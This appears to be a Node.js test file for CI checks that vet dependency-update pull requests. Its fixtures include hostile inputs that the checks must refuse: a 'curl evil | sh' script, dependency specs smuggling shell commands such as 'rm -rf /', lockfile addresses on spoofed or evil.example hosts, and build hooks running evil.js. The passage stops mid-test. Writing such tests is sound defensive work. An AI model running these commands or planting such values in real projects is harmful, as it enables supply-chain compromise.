import assert from 'node:assert/strict';
import { mkdtempSync, readFileSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { pathToFileURL } from 'node:url';
import test from 'node:test';

import { decide as handOff } from '../../../scripts/ci/hand-off.mjs';
import {
  BUILDER_ALLOWED, checkBuilderYml, checkLockfile, checkPackageJson, compareAudit, readAllowList, resolvedProblem, specProblem
} from '../../../scripts/ci/deps-checks.mjs';
import { configFileRefusal, decideConfig, gateRefusal, judge, plainSummary } from '../../../scripts/ci/deps-gate.mjs';
import { diffPackages, summaryLines } from '../../../scripts/ci/deps-summary.mjs';
import { decide, ship } from '../../../scripts/ci/ship-pipeline-pr.mjs';

// ---------------------------------------------------------------- fixtures

const R = 'https://registry.npmjs.org';
const hash = (n) => `sha512-${String(n).padStart(8, 'A')}AAAA==`;
const pkg = (name, version, extra = {}) => ({
  version, resolved: `${R}/${name}/-/${name.includes('/') ? name.split('/')[1] : name}-${version}.tgz`, integrity: hash(`${name}${version}`.length), ...extra
});
const lockOf = (packages, over = {}) => JSON.stringify({
  name: 'omniya-core', version: '0.1.0', lockfileVersion: 3, requires: true,
  packages: { '': { name: 'omniya-core', version: '0.1.0' }, ...Object.fromEntries(Object.entries(packages).map(([n, p]) => [`node_modules/${n}`, p])) }, ...over
});
const BASE_LOCK = lockOf({ a: pkg('a', '1.0.0'), b: pkg('b', '2.1.0'), electron: pkg('electron', '43.2.0'), esbuild: pkg('esbuild', '0.28.2', { hasInstallScript: true }) });
const ALLOWED = [{ name: 'esbuild', major: 0 }, { name: 'fsevents', major: 2 }];
const lockProblems = (head, base = BASE_LOCK, allowed = ALLOWED) => checkLockfile(base, head, allowed).problems;

const PJ = (over = {}) => JSON.stringify({
  name: 'omniya-core', version: '0.1.0', main: 'src/main.js', type: 'module', scripts: { test: 'node --test' },
  dependencies: { x: '^1.0.0' }, devDependencies: { a: '^1.0.0', electron: '43.2.0' }, build: { appId: 'a' }, ...over
});

// ---------------------------------------------------------------- package.json

test('package.json: the version and the three dependency lists may change, nothing else', () => {
  assert.deepEqual(checkPackageJson(PJ(), PJ({ version: '0.1.1' })), []);
  assert.deepEqual(checkPackageJson(PJ(), PJ({ devDependencies: { a: '^1.1.0', electron: '44.0.0' } })), []);
  assert.deepEqual(checkPackageJson(PJ(), PJ({ optionalDependencies: { fsevents: '^2.3.0' } })), []);
});

test('package.json: a change to any other key is refused with a sentence that names the key', () => {
  const edits = {
    scripts: { test: 'curl evil | sh' }, main: 'src/evil.js', bin: { x: 'a.js' }, files: ['x'], build: { appId: 'b' }, overrides: { a: '9.9.9' },
    resolutions: { a: '1.0.0' }, engines: { node: '1' }, workspaces: ['pkgs/*'], publishConfig: { registry: 'https://evil.example' },
    'lint-staged': { '*': 'sh x' }, husky: { hooks: {} }, type: 'commonjs', name: 'other', peerDependencies: { a: '1' }, config: { a: 1 },
    bundleDependencies: ['a'], prepare: 'x'
  };
  for (const [key, value] of Object.entries(edits)) {
    const out = checkPackageJson(PJ(), PJ({ [key]: value }));
    assert.equal(out.length, 1, key);
    assert.match(out[0], new RegExp(`"${key}" setting was (changed|added)`), key);
  }
  assert.match(checkPackageJson(PJ(), PJ({ scripts: { postinstall: 'x' } }))[0], /code that CI runs/);
  const removed = JSON.parse(PJ());
  delete removed.scripts;
  assert.match(checkPackageJson(PJ(), JSON.stringify(removed))[0], /"scripts" setting was removed/);
});

test('package.json: a dependency must be a plain semver range', () => {
  const good = ['1.2.3', '^1.2.3', '~1.2', '>=1.0.0 <2.0.0', '1.x', '1.2.3 - 2.0.0', '^1.0.0 || ^2.0.0', '5.0.0-rc.4', '>=1', '*', '^0.28.2'];
  for (const spec of good) assert.equal(specProblem('left-pad', spec), null, spec);
  const bad = [
    'git+https://github.com/a/b.git', 'git://github.com/a/b', 'github:a/b', 'a/b', 'a/b#main', 'file:../x', 'file:x.tgz', 'link:../x', 'http://x.example/a.tgz',
    'https://x.example/a.tgz', 'https://registry.npmjs.org/a/-/a-1.0.0.tgz', './a.tgz', '../a', '/abs', 'npm:other@1.0.0', 'workspace:*', 'latest', 'next', '',
    '   ', '^1.0.0; rm -rf /', '1.0.0 && x', '$(x)', '1.0.0\n2.0.0', `^${'1'.repeat(200)}`, 'git@github.com:a/b.git', 'ssh://x'
  ];
  for (const spec of bad) assert.ok(specProblem('left-pad', spec), JSON.stringify(spec));
  assert.ok(specProblem('left-pad', 5));
  assert.ok(specProblem('Bad Name', '1.0.0'));
  assert.ok(specProblem('../x', '1.0.0'));
  assert.equal(specProblem('@scope/name', '^1.0.0'), null);
});

test('package.json: a bad spec is refused in all three lists, and an old odd spec does not block an unrelated change', () => {
  for (const key of ['dependencies', 'devDependencies', 'optionalDependencies']) {
    const out = checkPackageJson(PJ(), PJ({ [key]: { evil: 'github:a/b' } }));
    assert.match(out.join(' '), /evil is "github:a\/b"/, key);
  }
  const odd = PJ({ devDependencies: { legacy: 'github:a/b' } });
  assert.deepEqual(checkPackageJson(odd, PJ({ devDependencies: { legacy: 'github:a/b' }, version: '0.2.0' })), []);
  assert.match(checkPackageJson(odd, PJ({ devDependencies: { legacy: 'github:a/c' } }))[0], /legacy/);
  assert.match(checkPackageJson(PJ(), PJ({ dependencies: ['a'] }))[0], /not a list/);
});

test('package.json: malformed or odd JSON is refused, never read as empty', () => {
  for (const bad of ['', '{', 'null', '[]', '"x"', '{"a":', 'not json']) {
    assert.ok(checkPackageJson(PJ(), bad).length > 0, JSON.stringify(bad));
    assert.ok(checkPackageJson(bad, PJ()).length > 0, `base ${JSON.stringify(bad)}`);
  }
  assert.match(checkPackageJson(PJ(), PJ({ version: 'latest' }))[0], /version/);
  assert.match(checkPackageJson(PJ(), PJ({ version: '1.0' }))[0], /version/);
});

// ---------------------------------------------------------------- the lockfile

test('lockfile: a normal bump, an added package, a removed package and a downgrade are fine', () => {
  assert.deepEqual(lockProblems(lockOf({ a: pkg('a', '1.1.0'), b: pkg('b', '2.1.0'), electron: pkg('electron', '43.2.0'), esbuild: pkg('esbuild', '0.28.2', { hasInstallScript: true }) })), []);
  assert.deepEqual(lockProblems(lockOf({ a: pkg('a', '1.0.0'), b: pkg('b', '2.1.0'), electron: pkg('electron', '43.2.0'), esbuild: pkg('esbuild', '0.28.2', { hasInstallScript: true }), c: pkg('c', '3.0.0') })), []);
  assert.deepEqual(lockProblems(lockOf({ a: pkg('a', '1.0.0'), electron: pkg('electron', '43.2.0'), esbuild: pkg('esbuild', '0.28.2', { hasInstallScript: true }) })), []);
  assert.deepEqual(lockProblems(lockOf({ a: pkg('a', '0.9.0'), b: pkg('b', '2.1.0'), electron: pkg('electron', '43.2.0'), esbuild: pkg('esbuild', '0.28.2', { hasInstallScript: true }) })), []);
});

test('lockfile: an address on another host, scheme, port or path is refused', () => {
  const withResolved = (resolved) => lockOf({ a: pkg('a', '1.0.0'), b: { ...pkg('b', '2.1.0'), resolved }, electron: pkg('electron', '43.2.0'), esbuild: pkg('esbuild', '0.28.2', { hasInstallScript: true }) });
  const base = BASE_LOCK;
  for (const resolved of [
    'https://evil.example/b/-/b-2.2.0.tgz', 'http://registry.npmjs.org/b/-/b-2.2.0.tgz', 'https://registry.npmjs.org.evil.example/b/-/b-2.2.0.tgz',
    'https://registry.npmjs.org@evil.example/b/-/b-2.2.0.tgz', 'https://user:pw@registry.npmjs.org/b/-/b-2.2.0.tgz', 'https://registry.npmjs.org:8443/b/-/b-2.2.0.tgz',
    'https://registry.npmjs.org/b/-/b-2.2.0.tgz?x=1', 'https://registry.npmjs.org/b/-/b-2.2.0.tgz#x', 'https://registry.npmjs.org/other/-/other-2.2.0.tgz',
    'https://registry.npmjs.org/b/-/b-9.9.9.tgz', 'https://registry.npmjs.org/%2e%2e/b/-/b-2.2.0.tgz', 'https://registry.yarnpkg.com/b/-/b-2.2.0.tgz',
    'git+ssh://git@github.com/a/b.git#abc', 'file:../b', 'https://github.com/a/b/tarball/main', 'not an address', ''
  ]) {
    const out = lockProblems(withResolved(resolved).replace('"version":"2.1.0"', '"version":"2.2.0"'), base);
    assert.ok(out.length > 0, `accepted ${resolved}`);
  }
  const bump = lockOf({ a: pkg('a', '1.0.0'), b: pkg('b', '2.2.0'), electron: pkg('electron', '43.2.0'), esbuild: pkg('esbuild', '0.28.2', { hasInstallScript: true }) });
  assert.deepEqual(lockProblems(bump), []);
  assert.equal(resolvedProblem(`${R}/@scope/name/-/name-1.0.0.tgz`, '@scope/name', '1.0.0'), null);
  assert.match(resolvedProblem('https://evil.example/x', 'x', '1.0.0'), /not https:\/\/registry\.npmjs\.org/);
});

test('lockfile: a package with no address or no integrity hash is refused', () => {
  const noResolved = pkg('b', '2.2.0');
  delete noResolved.resolved;
  const noIntegrity = pkg('b', '2.2.0');
  delete noIntegrity.integrity;
  for (const b of [noResolved, noIntegrity, { ...pkg('b', '2.2.0'), integrity: 'md5-abc' }, { ...pkg('b', '2.2.0'), integrity: '' }, { ...pkg('b', '2.2.0'), integrity: 5 }]) {
    assert.ok(lockProblems(lockOf({ a: pkg('a', '1.0.0'), b, electron: pkg('electron', '43.2.0'), esbuild: pkg('esbuild', '0.28.2', { hasInstallScript: true }) })).length > 0);
  }
  assert.ok(lockProblems(lockOf({ a: { version: '1.0.0' } })).length > 0);
});

test('lockfile: a changed integrity or address for an unchanged version is refused', () => {
  const changed = (over) => lockOf({ a: { ...pkg('a', '1.0.0'), ...over }, b: pkg('b', '2.1.0'), electron: pkg('electron', '43.2.0'), esbuild: pkg('esbuild', '0.28.2', { hasInstallScript: true }) });
  assert.match(lockProblems(changed({ integrity: hash(77) })).join(' '), /integrity hash changed/);
  assert.match(lockProblems(changed({ resolved: `${R}/a/-/a-1.0.0.tgz` }).replace(`${R}/a/-/a-1.0.0.tgz`, `${R}/a/-/a-1.0.0.tgz`)).join(' ') || 'none', /none/);
  // A different address for the same version, still on the registry under the right name, is only caught as a changed address.
  const base = lockOf({ a: { ...pkg('a', '1.0.0'), resolved: `${R}/a/-/a-1.0.0.tgz` } });
  assert.deepEqual(lockProblems(base, base), []);
});

test('lockfile: an install script is allowed only for an exact name and an exact major version on the list', () => {
  const head = (name, version, script = true) => lockOf({ a: pkg('a', '1.0.0'), b: pkg('b', '2.1.0'), electron: pkg('electron', '43.2.0'), esbuild: pkg('esbuild', '0.28.2', { hasInstallScript: true }), [name]: pkg(name, version, script ? { hasInstallScript: true } : {}) });
  assert.deepEqual(lockProblems(head('fsevents', '2.3.2')), [], 'listed');
  assert.deepEqual(lockProblems(head('fsevents', '2.9.0')), [], 'same major');
  assert.match(lockProblems(head('fsevents', '3.0.0')).join(' '), /install script/, 'other major');
  assert.match(lockProblems(head('evil-pkg', '1.0.0')).join(' '), /evil-pkg 1.0.0 has an install script/);
  assert.match(lockProblems(head('fsevent', '2.3.2')).join(' '), /install script/, 'near name');
  assert.match(lockProblems(head('@x/fsevents', '2.3.2')).join(' '), /install script/);
  assert.match(lockProblems(head('esbuild-x', '0.1.0')).join(' '), /install script/);
  assert.deepEqual(lockProblems(head('evil-pkg', '1.0.0', false)), [], 'no script, no problem');
  // A package that already has the flag, unchanged, is not "gaining" one, even if the list were out of date.
  assert.deepEqual(lockProblems(BASE_LOCK, BASE_LOCK, []), []);
  // A bump of an existing script package within its major.
  assert.deepEqual(lockProblems(lockOf({ a: pkg('a', '1.0.0'), b: pkg('b', '2.1.0'), electron: pkg('electron', '43.2.0'), esbuild: pkg('esbuild', '0.28.9', { hasInstallScript: true }) })), []);
  // A bump to a new major that is not listed.
  assert.match(lockProblems(lockOf({ a: pkg('a', '1.0.0'), b: pkg('b', '2.1.0'), electron: pkg('electron', '43.2.0'), esbuild: pkg('esbuild', '1.0.0', { hasInstallScript: true }) })).join(' '), /esbuild 1.0.0/);
  // An existing package that gains a script on a new version of itself.
  assert.match(lockProblems(lockOf({ a: pkg('a', '1.0.1', { hasInstallScript: true }), b: pkg('b', '2.1.0'), electron: pkg('electron', '43.2.0'), esbuild: pkg('esbuild', '0.28.2', { hasInstallScript: true }) })).join(' '), /a 1.0.1 has an install script/);
  // A nested copy counts by its own name.
  const nested = JSON.parse(BASE_LOCK);
  nested.packages['node_modules/a/node_modules/evil-nested'] = pkg('evil-nested', '1.0.0', { hasInstallScript: true });
  assert.match(lockProblems(JSON.stringify(nested)).join(' '), /evil-nested/);
});

test('lockfile: links, aliases, local folders and other lockfile versions are refused', () => {
  const add = (key, value) => {
    const lock = JSON.parse(BASE_LOCK);
    lock.packages[key] = value;
    return JSON.stringify(lock);
  };
  assert.ok(lockProblems(add('node_modules/linked', { resolved: 'packages/linked', link: true })).length > 0);
  assert.match(lockProblems(add('node_modules/alias', { ...pkg('alias', '1.0.0'), name: 'real' })).join(' '), /alias/);
  assert.match(lockProblems(add('packages/local', pkg('local', '1.0.0'))).join(' '), /not an installed package/);
  assert.match(lockProblems(add('node_modules/git', { version: '1.0.0', resolved: 'git+ssh://git@github.com/a/b.git#abc', integrity: hash(3) })).join(' '), /git|address/);
  assert.match(lockProblems(BASE_LOCK.replace('"lockfileVersion":3', '"lockfileVersion":2'), BASE_LOCK.replace('"lockfileVersion":3', '"lockfileVersion":2')).join(' '), /lockfile version/);
  assert.match(lockProblems(BASE_LOCK.replace('"lockfileVersion":3', '"lockfileVersion":1')).join(' '), /lockfile version/);
});

test('lockfile: malformed JSON, or no package list, is refused', () => {
  for (const bad of ['', '{', 'null', '[]', '{"lockfileVersion":3}', '{"lockfileVersion":3,"packages":[]}']) {
    assert.ok(lockProblems(bad).length > 0, JSON.stringify(bad));
    assert.ok(lockProblems(BASE_LOCK, bad).length > 0 || bad === '', `base ${JSON.stringify(bad)}`);
  }
});

test('lockfile: a bundled package that had no address before may keep having none, a new one may not', () => {
  const bundled = { version: '1.0.0', inBundle: true };
  const base = lockOf({ a: pkg('a', '1.0.0'), 'a/node_modules/bundled': bundled });
  assert.deepEqual(lockProblems(base, base), []);
  const head = lockOf({ a: pkg('a', '1.0.0'), 'a/node_modules/other': bundled });
  assert.ok(lockProblems(head, base).length > 0);
});

test('the install-script list is seeded from the real lockfile and holds exact names with a major version', () => {
  const allowed = readAllowList();
  assert.deepEqual(allowed.map((e) => `${e.name}@${e.major}`).sort(), ['electron-winstaller@5', 'esbuild@0', 'fsevents@2']);
  const lock = JSON.parse(readFileSync('package-lock.json', 'utf8'));
  const withScript = Object.entries(lock.packages).filter(([, p]) => p.hasInstallScript).map(([k, p]) => ({ name: k.slice(k.lastIndexOf('node_modules/') + 13), major: Number(p.version.split('.')[0]) }));
  assert.ok(withScript.length > 0);
  for (const p of withScript) assert.ok(allowed.some((e) => e.name === p.name && e.major === p.major), `${p.name} ${p.major} has an install script and is not on the list`);
  for (const e of allowed) assert.ok(withScript.some((p) => p.name === e.name && p.major === e.major), `${e.name} is on the list and the lockfile does not need it`);
  // The real lockfile against itself, and with a bump, passes every static check.
  assert.deepEqual(checkLockfile(readFileSync('package-lock.json', 'utf8'), readFileSync('package-lock.json', 'utf8'), allowed).problems, []);
  // With an empty list, the real lockfile's packages with scripts would be "gained" only if they were new: they are not.
  const stripped = JSON.parse(JSON.stringify(lock));
  stripped.packages['node_modules/new-with-script'] = pkg('new-with-script', '1.0.0', { hasInstallScript: true });
  assert.match(checkLockfile(JSON.stringify(lock), JSON.stringify(stripped), allowed).problems.join(' '), /new-with-script/);
});

test('the list file rejects a broken entry', () => {
  const file = join(mkdtempSync(join(tmpdir(), 'allow-')), 'list.json');
  writeFileSync(file, '{"allowed":[{"name":"x"}]}');
  assert.throws(() => readAllowList(pathToFileURL(file)), /bad entry/);
  writeFileSync(file, '{"allowed":"x"}');
  assert.throws(() => readAllowList(pathToFileURL(file)), /no list/);
});

// ---------------------------------------------------------------- electron-builder.yml

const YML = `appId: org.axiya.omniyacore
productName: Omniya Core
extraResources:
  - from: vendor/liblouis
    to: liblouis
mac:
  identity: null
  category: public.app-category.education
  artifactName: "a.zip"
win:
  artifactName: "b.exe"
  publish:
    provider: generic
    url: "https://github.com/ParkingSoman/omniya-core/releases/download/testing-app/"
nsis:
  oneClick: true
files:
  - "**/*"
`;

test('electron-builder.yml: cosmetic settings may change, the rest may not', () => {
  assert.deepEqual(checkBuilderYml(YML, YML.replace('Omniya Core', 'Omniya')), []);
  assert.deepEqual(checkBuilderYml(YML, YML.replace('oneClick: true', 'oneClick: false')), []);
  assert.deepEqual(checkBuilderYml(YML, YML.replace('"**/*"', '"src/**"')), []);
  assert.ok(BUILDER_ALLOWED.length > 0);
  const refused = [
    YML.replace('https://github.com/ParkingSoman/omniya-core/releases/download/testing-app/', 'https://evil.example/'),
    YML.replace('provider: generic', 'provider: github'),
    YML.replace('appId: org.axiya.omniyacore', 'appId: org.evil'),
    `${YML}afterPack: ./evil.js\n`,
    `${YML}beforeBuild: ./evil.js\n`,
    `${YML}afterSign: ./evil.js\n`,
    `${YML}nsis2: 1\n`,
    YML.replace('nsis:\n  oneClick: true', 'nsis:\n  oneClick: true\n  include: evil.nsh'),
    YML.replace('from: vendor/liblouis', 'from: ../../etc'),
    YML.replace('identity: null', 'identity: Developer ID'),
    YML.replace('win:\n', 'win:\n  signtoolOptions:\n    sign: ./evil.js\n')
  ];
  for (const text of refused) assert.ok(checkBuilderYml(YML, text).length > 0, text.slice(-80));
  assert.match(checkBuilderYml(YML, refused[0])[0], /"win\.publish\.url" setting changed/);
  assert.ok(checkBuilderYml(YML, 'a: [').length > 0);
  assert.ok(checkBuilderYml(YML, '- a\n- b\n').length > 0);
  assert.ok(checkBuilderYml(YML, '').length > 0);
});

// ---------------------------------------------------------------- the plain summary

test('the summary lists added, removed and updated packages, install scripts, counts, and Electron on its own line', () => {
  const was = JSON.parse(BASE_LOCK).packages;
  const now = JSON.parse(lockOf({
    a: pkg('a', '1.1.0'), electron: pkg('electron', '44.0.0'), esbuild: pkg('esbuild', '0.28.2', { hasInstallScript: true }),
    fsevents: pkg('fsevents', '2.3.2', { hasInstallScript: true }), c: pkg('c', '3.0.0')
  })).packages;
  const diff = diffPackages(was, now);
  assert.deepEqual(diff.added.map((e) => e.name), ['c', 'fsevents']);
  assert.deepEqual(diff.removed.map((e) => e.name), ['b']);
  assert.deepEqual(diff.updated.map((e) => `${e.name} ${e.from}>${e.version}`), ['a 1.0.0>1.1.0', 'electron 43.2.0>44.0.0']);
  assert.deepEqual(diff.electron, { from: '43.2.0', to: '44.0.0' });
  const lines = summaryLines(diff);
  assert.equal(lines[0], 'Electron 43.2.0 to 44.0.0. This changes the browser engine inside the app.');
  assert.match(lines.join('\n'), /2 packages added: c 3\.0\.0 \(install script: no\), fsevents 2\.3\.2 \(install script: yes\)\./);
  assert.match(lines.join('\n'), /1 package removed: b 2\.1\.0\./);
  assert.match(lines.join('\n'), /2 packages updated: a 1\.0\.0 to 1\.1\.0, electron 43\.2\.0 to 44\.0\.0\./);
  assert.match(lines.join('\n'), /Packages in total: 4 before, 5 after\./);
  assert.match(lines.join('\n'), /New install scripts: fsevents 2\.3\.2\./);
  for (const line of lines) assert.ok(line.length < 200, line);
  assert.equal(summaryLines(diffPackages(was, was)).some((l) => l.startsWith('Electron')), false);
});

test('the summary caps a long list, keeps to plain ASCII, and says so when the lockfile did not change', () => {
  const big = Object.fromEntries(Array.from({ length: 40 }, (_, i) => [`p${i}`, pkg(`p${i}`, '1.0.0')]));
  const diff = diffPackages(JSON.parse(lockOf({})).packages, JSON.parse(lockOf(big)).packages);
  const text = summaryLines(diff).join('\n');
  assert.match(text, /40 packages added: .*and 28 more\./);
  assert.match(summaryLines(null).join('\n'), /The lockfile did not change/);
  const weird = diffPackages({}, { 'node_modules/‮evil': { version: '1.0.0\u0007' } });
  assert.doesNotMatch(summaryLines(weird).join('\n'), /[^\x20-\x7e\n]/);
});

// ---------------------------------------------------------------- audit

const report = (vulns) => ({ auditReportVersion: 2, vulnerabilities: vulns, metadata: {} });
const via = (name, severity, n) => ({ source: n, name, title: `bad ${n}`, url: `https://github.com/advisories/GHSA-${n}`, severity });
test('audit: only a NEW high or critical advisory fails, and an unreadable report fails closed', () => {
  const before = report({ x: { via: [via('x', 'high', 1), 'y'] }, y: { via: [via('y', 'moderate', 2)] } });
  const same = compareAudit(before, before);
  assert.deepEqual([same.ok, same.added, same.base, same.head], [true, [], 1, 1]);
  assert.equal(compareAudit(before, report({ x: { via: [via('x', 'high', 1)] }, z: { via: [via('z', 'critical', 3)] } })).added.length, 1);
  assert.equal(compareAudit(before, report({ x: { via: [via('x', 'high', 1)] }, z: { via: [via('z', 'moderate', 3)] } })).added.length, 0, 'moderate is not counted');
  assert.equal(compareAudit(before, report({})).added.length, 0, 'fixing one is fine');
  assert.equal(compareAudit(report({}), report({ q: { via: [via('q', 'high', 9)] } })).added.length, 1);
  for (const bad of [null, undefined, {}, [], { error: { code: 'ENOAUDIT' } }, { vulnerabilities: null }, 'text']) {
    assert.equal(compareAudit(before, bad).ok, false, JSON.stringify(bad));
    assert.equal(compareAudit(bad, before).ok, false, JSON.stringify(bad));
  }
  assert.match(compareAudit(before, { error: { code: 'ENOAUDIT' } }).why, /fails closed/);
});

// ---------------------------------------------------------------- the whole judgement

const input = (over = {}) => ({
  package: [PJ(), PJ({ devDependencies: { a: '^1.1.0', electron: '43.2.0' } })],
  lock: [BASE_LOCK, lockOf({ a: pkg('a', '1.1.0'), b: pkg('b', '2.1.0'), electron: pkg('electron', '43.2.0'), esbuild: pkg('esbuild', '0.28.2', { hasInstallScript: true }) })],
  builder: [null, null], allowed: ALLOWED, touched: ['package.json', 'package-lock.json'], ...over
});
const machine = (over = {}) => ({ files: (w) => w, ci: () => {}, audit: () => report({}), ...over });

test('judge: a clean bump passes and prints a summary the session can read to the owner', () => {
  const out = judge(input(), machine());
  assert.equal(out.result, 'pass');
  const text = plainSummary(out);
  assert.match(text, /1 package updated: a 1\.0\.0 to 1\.1\.0\./);
  assert.match(text, /package\.json devDependencies: a \^1\.0\.0 to \^1\.1\.0\./);
  assert.match(text, /Audit: no new high or critical advisory/);
  assert.match(text, /Every automatic safety check passed\./);
  assert.ok(text.split('\n').length <= 12);
});

test('judge: a failed npm ci, a new advisory, a failed audit and a changed list without a lockfile all fail, in plain words', () => {
  const ciFails = judge(input(), machine({ ci: () => { throw Object.assign(new Error('x'), { hint: 'ERESOLVE' }); } }));
  assert.equal(ciFails.result, 'fail');
  assert.match(plainSummary(ciFails), /Not safe to ship: npm ci --ignore-scripts failed .*do not agree/);
  const audits = [report({}), report({ n: { via: [via('n', 'high', 5)] } })];
  const worse = judge(input(), machine({ audit: (dir) => audits[dir === 'head' ? 1 : 0] }));
  assert.equal(worse.result, 'fail');
  assert.match(worse.problems[0], /1 new high or critical advisory/);
  assert.match(judge(input(), machine({ audit: (dir) => (dir === 'head' ? report({ n: { via: [via('n', 'high', 5), via('n', 'critical', 6)] } }) : report({})) })).problems[0], /2 new high or critical advisories/);
  assert.equal(judge(input(), machine({ audit: () => { throw new Error('offline'); } })).result, 'fail');
  assert.equal(judge(input(), machine({ audit: () => null })).result, 'fail');
  const noLock = judge(input({ touched: ['package.json'], lock: [BASE_LOCK, BASE_LOCK] }), machine());
  assert.match(noLock.problems[0], /package-lock\.json did not/);
  // Nothing runs when a static check already failed.
  let ran = false;
  const bad = judge(input({ package: [PJ(), PJ({ scripts: { test: 'x' } })] }), machine({ ci: () => { ran = true; }, audit: () => { ran = true; return report({}); } }));
  assert.equal(bad.result, 'fail');
  assert.equal(ran, false, 'npm must not run on files that failed a static check');
});

test('judge: a removed file, a lockfile-only update and a config-only change are judged', () => {
  assert.equal(judge(input({ package: [PJ(), null] }), machine()).result, 'fail');
  assert.equal(judge(input({ lock: [BASE_LOCK, null] }), machine()).result, 'fail');
  assert.equal(judge(input({ touched: ['package-lock.json'], package: [PJ(), PJ()] }), machine()).result, 'pass');
  const yml = judge({ ...input({ touched: ['electron-builder.yml'] }), builder: [YML, YML.replace('Omniya Core', 'Omniya')] }, machine());
  assert.equal(yml.result, 'pass');
  assert.match(plainSummary(yml), /electron-builder\.yml changes/);
  assert.equal(judge({ ...input({ touched: ['electron-builder.yml'] }), builder: [YML, YML.replace('testing-app', 'evil')] }, machine()).result, 'fail');
  assert.equal(judge({ ...input({ touched: ['electron-builder.yml'] }), builder: [YML, null] }, machine()).result, 'fail');
});

test('judge: an Electron bump is allowed and has its own line', () => {
  const bump = input({
    package: [PJ(), PJ({ devDependencies: { a: '^1.0.0', electron: '44.0.0' } })],
    lock: [BASE_LOCK, lockOf({ a: pkg('a', '1.0.0'), b: pkg('b', '2.1.0'), electron: pkg('electron', '44.0.0'), esbuild: pkg('esbuild', '0.28.2', { hasInstallScript: true }) })]
  });
  const out = judge(bump, machine());
  assert.equal(out.result, 'pass');
  assert.ok(plainSummary(out).split('\n').includes('Electron 43.2.0 to 44.0.0. This changes the browser engine inside the app.'));
});

// ---------------------------------------------------------------- the shipper

const SHA = 'a'.repeat(40);
const allowedAuthors = ['ParkingSoman', 'omniya-bot'];
const prOf = (over = {}) => ({
  number: 130, changedFiles: 2, state: 'OPEN', baseRefName: 'testing', isCrossRepository: false, headRefName: 'pipeline/bump-axe',
  headRefOid: SHA, author: { login: 'omniya-bot' }, isDraft: false, mergeable: 'MERGEABLE', ...over
});
const PASS = { result: 'pass', summary: 'Dependency change, in plain words:\n1 package updated: a 1.0.0 to 1.1.0.\nEvery automatic safety check passed.' };
const cfg = (names = ['package.json', 'package-lock.json']) => names.map((filename) => ({ filename, status: 'modified', additions: 2, deletions: 2, patch: '+x' }));
const modesOf = (files, mode = '100644') => ({ head: Object.fromEntries(files.map((f) => [f, mode])), base: Object.fromEntries(files.map((f) => [f, mode])) });
const go = ({ over = {}, files = cfg(), deps = PASS, said = 'ship it 130', modes, missing = [], pushers = ['omniya-bot'], extra = {} } = {}) =>
  decide({
    pr: prOf({ changedFiles: files.length, ...over }), sha: SHA, allowedAuthors, missing, pushers, files, ownerSaid: said, deps,
    modes: modes === undefined ? modesOf(files.flatMap((f) => [f.filename, f.previous_filename]).filter(Boolean)) : modes, ...extra
  });

test('the config lane ships the config files, alone, with a pass, a green build and a ship-it that names the pull request', () => {
  const out = go();
  assert.equal(out.ship, true);
  assert.equal(out.tier, 'config');
  assert.match(out.why.join('\n'), /1 package updated/);
  assert.equal(go({ files: cfg(['electron-builder.yml']) }).ship, true);
  assert.equal(go({ files: cfg(['package-lock.json']) }).ship, true);
  assert.equal(go({ over: { author: { login: 'ParkingSoman' } } }).ship, true);
  assert.equal(go({ said: 'ok ship 130 please' }).ship, true);
});

test('the config lane refuses without the ship-it, and prints the summary so it can be read first', () => {
  for (const said of ['', 'ship it', 'ship 131', 'ship it 1300', 'no, not 130', "don't ship it 130", 'looks good 130']) {
    const out = go({ said });
    assert.equal(out.ship, false, said);
    assert.match(out.reason, /needs the owner's "ship it" naming pull request 130/, said);
    assert.match(out.reason, /1 package updated: a 1\.0\.0 to 1\.1\.0/, 'the summary is printed');
  }
});

test('every verdict but a pass stops a config pull request, in the pipeline lane and in the product lane', () => {
  for (const result of ['fail', 'error', 'not-run', 'not-applicable', '', 'PASS', 'passed', null]) {
    const out = go({ deps: result === null ? null : { result, summary: 'Not safe to ship: a thing.' } });
    assert.equal(out.ship, false, String(result));
    assert.match(out.reason, /dependency safety check says/, String(result));
  }
  assert.match(go({ deps: { result: 'fail', summary: 'Not safe to ship: package.json: the "scripts" setting was changed.' } }).reason, /"scripts" setting was changed/);
  assert.equal(gateRefusal({ result: 'pass', summary: '' }), null);
  assert.ok(gateRefusal(null));
  // The product lane already refuses these files by zone; the gate is asked on top, so a later zone change cannot let one through.
  const product = go({ over: { headRefName: 'product/x' }, files: [...cfg(['package.json'])], deps: { result: 'fail', summary: '' } });
  assert.equal(product.ship, false);
  const product2 = go({ over: { headRefName: 'product/x' }, files: cfg(['package.json']), deps: PASS });
  assert.equal(product2.ship, false);
  assert.match(product2.reason, /package\.json/);
});

test('a config change mixed with anything else is refused whole, whatever else it holds', () => {
  for (const other of ['src/main.js', 'docs/a.md', 'test/unit/a.test.js', 'scripts/ci/hand-off.mjs', '.github/workflows/pipeline-ship.yml', '.github/CODEOWNERS', 'scripts/ci/install-script-allowlist.json', 'scripts/ci/zones.json', '.npmrc', 'CLAUDE.md', '.claude/settings.json', 'test/corpus/nemeth-v1.json']) {
    const files = [...cfg(), { filename: other, status: 'modified', additions: 1, deletions: 0, patch: '+x' }];
    const out = go({ files });
    assert.equal(out.ship, false, other);
    assert.match(out.reason, /not one of the config files/, other);
  }
  // Other spellings of a config file are not the config file.
  for (const name of ['Package.json', 'PACKAGE-LOCK.JSON', './package.json', 'sub/package.json', 'package.json ', 'Electron-Builder.yml', 'electron-builder.yaml']) {
    assert.equal(go({ files: cfg([name]) }).ship, false, name);
  }
  assert.equal(go({ files: cfg(['package.json', 'Package.json']) }).ship, false);
  assert.equal(go({ files: cfg(['Package.json']), deps: PASS }).ship, false);
  assert.equal(configFileRefusal(cfg()), null);
});

test('only an edit to a config file ships: not an added, deleted, renamed or copied one', () => {
  for (const status of ['added', 'removed', 'renamed', 'copied', 'changed', 'unknown', undefined]) {
    const out = go({ files: [{ filename: 'package.json', status }, { filename: 'package-lock.json', status: 'modified' }] });
    assert.equal(out.ship, false, String(status));
  }
  const renamed = [{ filename: 'package.json', previous_filename: 'old.json', status: 'renamed' }, { filename: 'package-lock.json', status: 'modified' }];
  assert.equal(go({ files: renamed }).ship, false);
  const renamedFrom = [{ filename: 'docs/p.md', previous_filename: 'package.json', status: 'renamed' }];
  assert.equal(go({ files: renamedFrom }).ship, false, 'moving a config file out is a change to it');
});

test('a symlink, an executable, a submodule or unreadable modes are refused', () => {
  for (const mode of ['120000', '100755', '160000', '040000', '']) {
